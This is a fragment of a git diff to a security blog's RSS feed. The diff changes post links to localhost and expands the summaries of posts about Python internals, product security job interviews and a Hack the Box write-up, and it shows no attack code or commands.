+<p>While researching for this article, I learnt many things about Python internals. I found this quite interesting, and therefore, plan to look more into Python internals - and research other unsafe patterns that could lead to security issues. I also plan to use what I learn to look for security issues in open source code. Only time will tell how successful I am in these endeavors!</p>
+<p>Thanks for reading!</p>
+]]></content>
+        </item>
         
         <item>
             <title>Tales from my Product Security Job Hunt: Part 2, Preparation</title>
-            <link>https://baishya.xyz/posts/interview-prep/</link>
+            <link>http://localhost:1313/posts/interview-prep/</link>
             <pubDate>Sun, 14 Jan 2024 21:51:34 -0800</pubDate>
             
-            <guid>https://baishya.xyz/posts/interview-prep/</guid>
-            <description>This is part 2 of my interview experience and preparation series, where I will talk about how I prepared for the interviews. Check out part 1 where I talk more about the process and types of interviews here
-As I mentioned in my previous post, this is catered to my search criteria, which was:
-Experience: Mid-level (~4–5 years of experience) Role: Product Security / Application Security Even within the roles I was looking for, different openings had slightly different requirements.</description>
+            <guid>http://localhost:1313/posts/interview-prep/</guid>
+            <description>&lt;p&gt;This is part 2 of my interview experience and preparation series, where I will talk about how I prepared for the interviews. Check out part 1 where I talk more about the process and types of interviews &lt;a href=&#34;https://www.baishya.xyz/posts/types-of-interviews/&#34;&gt;here&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;As I mentioned in my previous post, this is catered to my search criteria, which was:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Experience: Mid-level (~4–5 years of experience)&lt;/li&gt;
+&lt;li&gt;Role: Product Security / Application Security&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Even within the roles I was looking for, different openings had slightly different requirements. For example, an application security role for a team/company that has a large mobile application footprint is likely to involve duties related to securing these applications — and therefore, the candidate would be expected to know about mobile application security.&lt;/p&gt;</description>
             <content type="html"><![CDATA[<p>This is part 2 of my interview experience and preparation series, where I will talk about how I prepared for the interviews. Check out part 1 where I talk more about the process and types of interviews <a href="https://www.baishya.xyz/posts/types-of-interviews/">here</a></p>
 <p>As I mentioned in my previous post, this is catered to my search criteria, which was:</p>
 <ul>
@@ -126,12 +530,12 @@ Experience: Mid-level (~4–5 years of experience) Role: Product Security / Appl
         
         <item>
             <title>Tales from my Product Security Job Hunt: Part 1, Interview Types</title>
-            <link>https://baishya.xyz/posts/types-of-interviews/</link>
+            <link>http://localhost:1313/posts/types-of-interviews/</link>
             <pubDate>Sun, 07 Jan 2024 16:12:46 -0800</pubDate>
             
-            <guid>https://baishya.xyz/posts/types-of-interviews/</guid>
-            <description>After spending 4 amazing years at Adobe, I recently decided it was time to take the next step in my career. I was fortunate to interview with several companies that varied in terms of their domain, size, or the maturity of their security processes.
-Many of those whom I informed about my decision and/or my interviews were interested in knowing what the process was like and how I prepared. After answering the same questions a few times, I thought it would be helpful to potential job seekers if I documented my experiences.</description>
+            <guid>http://localhost:1313/posts/types-of-interviews/</guid>
+            <description>&lt;p&gt;After spending 4 amazing years at Adobe, I recently decided it was time to take the next step in my career. I was fortunate to interview with several companies that varied in terms of their domain, size, or the maturity of their security processes.&lt;/p&gt;
+&lt;p&gt;Many of those whom I informed about my decision and/or my interviews were interested in knowing what the process was like and how I prepared. After answering the same questions a few times, I thought it would be helpful to potential job seekers if I documented my experiences. Therefore, I am writing this two-part series that will talk about the types of interviews I attempted, and how I prepared for them. This blog in particular will list the types of interviews. In the next one, I will talk about my preparation and provide some tips that worked for me.&lt;/p&gt;</description>
             <content type="html"><![CDATA[<p>After spending 4 amazing years at Adobe, I recently decided it was time to take the next step in my career. I was fortunate to interview with several companies that varied in terms of their domain, size, or the maturity of their security processes.</p>
 <p>Many of those whom I informed about my decision and/or my interviews were interested in knowing what the process was like and how I prepared. After answering the same questions a few times, I thought it would be helpful to potential job seekers if I documented my experiences. Therefore, I am writing this two-part series that will talk about the types of interviews I attempted, and how I prepared for them. This blog in particular will list the types of interviews. In the next one, I will talk about my preparation and provide some tips that worked for me.</p>
 <p>This list is specifically catered to the type of positions I was interviewing for. The interview rounds you have will vary according to your search criteria. My criteria:</p>
@@ -233,11 +637,11 @@ Many of those whom I informed about my decision and/or my interviews were intere
         
         <item>
             <title>Hack the Box — PC, but automated</title>
-            <link>https://baishya.xyz/posts/htb-pc/</link>
+            <link>http://localhost:1313/posts/htb-pc/</link>
             <pubDate>Mon, 06 Nov 2023 20:05:09 -0800</pubDate>
             
-            <guid>https://baishya.xyz/posts/htb-pc/</guid>
-            <description>PC is an easy Linux box that has a grpc service and a vulnerable version of an application running on it. While doing this box, I had gone to the forums for a hint, and I saw a comment that said something along the lines of “I wrote a script that can solve this box”. I found this quite intriguing and decided to write a script that could solve the box myself.</description>
+            <guid>http://localhost:1313/posts/htb-pc/</guid>
+            <description>&lt;p&gt;PC is an easy Linux box that has a grpc service and a vulnerable version of an application running on it. While doing this box, I had gone to the forums for a hint, and I saw a comment that said something along the lines of “I wrote a script that can solve this box”. I found this quite intriguing and decided to write a script that could solve the box myself.&lt;/p&gt;</description>
             <content type="html"><![CDATA[<p>PC is an easy Linux box that has a grpc service and a vulnerable version of an application running on it. While doing this box, I had gone to the forums for a hint, and I saw a comment that said something along the lines of “I wrote a script that can solve this box”. I found this quite intriguing and decided to write a script that could solve the box myself.</p>
 <p><em>Note 1: This is not a proper write-up of the PC box. There is already an official write-up by the creator of the box which is very thorough and explains all the details of the box. There are many unofficial writeups as well. There’s also ippsec’s video on his channel.</em></p>
 <p><em>Note 2: This script only automates the steps that need to be taken to get the flags. It does not automate the looking for the vulnerabilities part. After I completed the box, I automated the steps I took to get the flags.</em></p>
